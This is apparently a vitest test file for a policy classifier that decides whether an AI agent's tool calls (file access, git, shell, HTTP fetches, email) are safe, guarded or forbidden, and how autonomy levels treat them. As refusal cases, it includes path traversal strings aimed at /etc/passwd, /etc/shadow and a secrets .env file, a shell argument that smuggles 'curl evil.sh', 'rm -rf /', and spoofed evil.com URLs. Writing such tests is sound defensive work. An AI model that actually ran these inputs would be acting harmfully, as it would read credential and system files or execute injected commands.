import { describe, it, expect } from 'vitest';
import { classify, disposition, canPromote } from '../src/tools/effects.ts';
import { DEFAULT_POLICY, type PolicyConfig, type ToolCall } from '../src/domain/types.ts';

const policy: PolicyConfig = {
  ...DEFAULT_POLICY,
  allowedRoots: {
    developer: ['/srv/work/cubekrafts'],
    content: ['/srv/work/drafts'],
  },
  allowedHosts: ['cubekrafts.com', '.wikipedia.org'],
};

const call = (name: string, args: Record<string, unknown> = {}): ToolCall => ({
  id: 'toolu_test',
  name,
  args,
});

describe('default deny', () => {
  it('refuses a tool that does not exist', () => {
    expect(classify('developer', call('rm.rf'), policy).effect).toBe('forbidden');
  });

  it('refuses a real tool the role was not granted', () => {
    // content has no git access at all
    const c = classify('content', call('git.push', { _branch: 'foreman/x' }), policy);
    expect(c.effect).toBe('forbidden');
    expect(c.reason).toMatch(/not granted to content/);
  });

  it('refuses a granted tool called with the wrong argument shape', () => {
    expect(classify('developer', call('fs.read', { file: 'x' }), policy).effect).toBe('forbidden');
    expect(classify('developer', call('shell.run', { argv: 'npm test' }), policy).effect).toBe(
      'forbidden',
    );
  });
});

describe('filesystem jail', () => {
  it('allows a path inside the role workspace', () => {
    expect(classify('developer', call('fs.read', { path: 'src/index.js' }), policy).effect).toBe(
      'safe',
    );
  });

  it('refuses traversal out of the workspace', () => {
    for (const path of [
      '../../etc/passwd',
      '/etc/passwd',
      'src/../../../etc/shadow',
      '/srv/work/cubekrafts/../secrets/.env',
    ]) {
      const c = classify('developer', call('fs.write', { path, content: 'x' }), policy);
      expect(c.effect, `${path} should be forbidden`).toBe('forbidden');
    }
  });

  it('does not let a sibling directory pass a prefix check', () => {
    // /srv/work/cubekrafts-secrets must not satisfy /srv/work/cubekrafts
    const c = classify(
      'developer',
      call('fs.read', { path: '/srv/work/cubekrafts-secrets/key.pem' }),
      policy,
    );
    expect(c.effect).toBe('forbidden');
  });

  it('refuses a null byte in the path', () => {
    expect(classify('developer', call('fs.read', { path: 'a\0b' }), policy).effect).toBe(
      'forbidden',
    );
  });

  it('refuses everything when the role has no roots configured', () => {
    expect(classify('content', call('fs.read', { path: 'x' }), { ...policy, allowedRoots: {} }).effect).toBe(
      'forbidden',
    );
  });

  it('keeps roles out of each other workspaces', () => {
    const c = classify('content', call('fs.read', { path: '/srv/work/cubekrafts/src/index.js' }), policy);
    expect(c.effect).toBe('forbidden');
  });
});

describe('git', () => {
  it('allows committing on an agent branch', () => {
    expect(
      classify('developer', call('git.commit', { message: 'x', _branch: 'foreman/t-12' }), policy)
        .effect,
    ).toBe('safe');
  });

  it('forbids committing on main', () => {
    const c = classify('developer', call('git.commit', { message: 'x', _branch: 'main' }), policy);
    expect(c.effect).toBe('forbidden');
    expect(c.reason).toMatch(/protected branch/);
  });

  it('forbids committing on any branch that is not an agent branch', () => {
    expect(
      classify('developer', call('git.commit', { message: 'x', _branch: 'release/2.0' }), policy)
        .effect,
    ).toBe('forbidden');
  });

  it('fails closed when the current branch was not supplied', () => {
    expect(classify('developer', call('git.commit', { message: 'x' }), policy).effect).toBe(
      'forbidden',
    );
    expect(classify('developer', call('git.push', { title: 't', body: 'b' }), policy).effect).toBe(
      'forbidden',
    );
  });

  it('guards a push on an agent branch rather than allowing it', () => {
    const c = classify('developer', call('git.push', { title: 't', body: 'b', _branch: 'foreman/t-12' }), policy);
    expect(c.effect).toBe('guarded');
  });

  it('forbids a push to main outright, not merely guarding it', () => {
    const c = classify('developer', call('git.push', { title: 't', body: 'b', _branch: 'main' }), policy);
    expect(c.effect).toBe('forbidden');
  });

  it('forbids creating a branch outside the agent prefix', () => {
    expect(classify('developer', call('git.branch', { name: 'hotfix' }), policy).effect).toBe(
      'forbidden',
    );
  });
});

describe('shell', () => {
  it('allows an exact allowlisted command', () => {
    expect(classify('developer', call('shell.run', { argv: ['npm', 'test'] }), policy).effect).toBe(
      'safe',
    );
  });

  it('refuses anything not on the allowlist', () => {
    for (const argv of [
      ['npm', 'publish'],
      ['rm', '-rf', '/'],
      ['npm'],
      ['npm', 'test', '--', '--reporter=custom'],
    ]) {
      expect(
        classify('developer', call('shell.run', { argv }), policy).effect,
        argv.join(' '),
      ).toBe('forbidden');
    }
  });

  it('refuses shell metacharacters even inside an allowlisted prefix', () => {
    const c = classify('developer', call('shell.run', { argv: ['npm', 'test; curl evil.sh'] }), policy);
    expect(c.effect).toBe('forbidden');
    expect(c.reason).toMatch(/metacharacters/);
  });
});

describe('http', () => {
  it('allows an allowlisted host', () => {
    expect(
      classify('marketing', call('http.fetch', { url: 'https://cubekrafts.com/pricing' }), policy)
        .effect,
    ).toBe('safe');
  });

  it('allows a subdomain via a leading-dot entry', () => {
    expect(
      classify('marketing', call('http.fetch', { url: 'https://en.wikipedia.org/wiki/Modular' }), policy)
        .effect,
    ).toBe('safe');
  });

  it('guards an unlisted host rather than refusing it', () => {
    expect(
      classify('marketing', call('http.fetch', { url: 'https://example.com/' }), policy).effect,
    ).toBe('guarded');
  });

  it('refuses non-https and malformed urls', () => {
    expect(classify('marketing', call('http.fetch', { url: 'http://cubekrafts.com' }), policy).effect).toBe('forbidden');
    expect(classify('marketing', call('http.fetch', { url: 'file:///etc/passwd' }), policy).effect).toBe('forbidden');
    expect(classify('marketing', call('http.fetch', { url: 'not a url' }), policy).effect).toBe('forbidden');
  });

  it('is not fooled by an allowlisted host appearing elsewhere in the url', () => {
    for (const url of [
      'https://evil.com/?x=cubekrafts.com',
      'https://cubekrafts.com.evil.com/',
      'https://notcubekrafts.com/',
    ]) {
      expect(classify('marketing', call('http.fetch', { url }), policy).effect, url).toBe('guarded');
    }
  });
});

describe('email', () => {
  it('treats drafting as safe and sending as guarded', () => {
    expect(
      classify('sales', call('email.draft', { lead_id: '1', subject: 's', body: 'b' }), policy).effect,
    ).toBe('safe');
    expect(classify('sales', call('email.send', { draft_id: 'd1' }), policy).effect).toBe('guarded');
  });

  it('refuses a send with no draft to point at', () => {
    expect(classify('sales', call('email.send', {}), policy).effect).toBe('forbidden');
  });
});

describe('disposition', () => {
  const safeCall = { effect: 'safe', reason: 'r' } as const;
  const guardedCall = { effect: 'guarded', reason: 'r' } as const;
  const forbiddenCall = { effect: 'forbidden', reason: 'r' } as const;

  it('refuses a forbidden call at every autonomy level', () => {
    for (const level of ['propose', 'approve', 'notify', 'auto'] as const) {
      expect(disposition(forbiddenCall, level).action).toBe('refuse');
    }
  });

  it('queues everything at propose', () => {
    expect(disposition(safeCall, 'propose').action).toBe('queue');
    expect(disposition(guardedCall, 'propose').action).toBe('queue');
  });

  it('executes safe calls from approve upwards', () => {
    expect(disposition(safeCall, 'approve').action).toBe('execute');
    expect(disposition(safeCall, 'auto').action).toBe('execute');
  });

  it('queues guarded calls at approve and executes them above it', () => {
    expect(disposition(guardedCall, 'approve').action).toBe('queue');
    expect(disposition(guardedCall, 'notify').action).toBe('execute');
    expect(disposition(guardedCall, 'auto').action).toBe('execute');
  });
});

describe('promotion guard', () => {
  it('never lets the two outward-facing tools run unattended', () => {
    for (const tool of ['email.send', 'git.push']) {
      expect(canPromote(tool, 'notify').ok, tool).toBe(false);
      expect(canPromote(tool, 'auto').ok, tool).toBe(false);
      expect(canPromote(tool, 'approve').ok, tool).toBe(true);
      expect(canPromote(tool, 'propose').ok, tool).toBe(true);
    }
  });

  it('allows promotion of ordinary tools', () => {
    expect(canPromote('fs.read', 'auto').ok).toBe(true);
  });
});
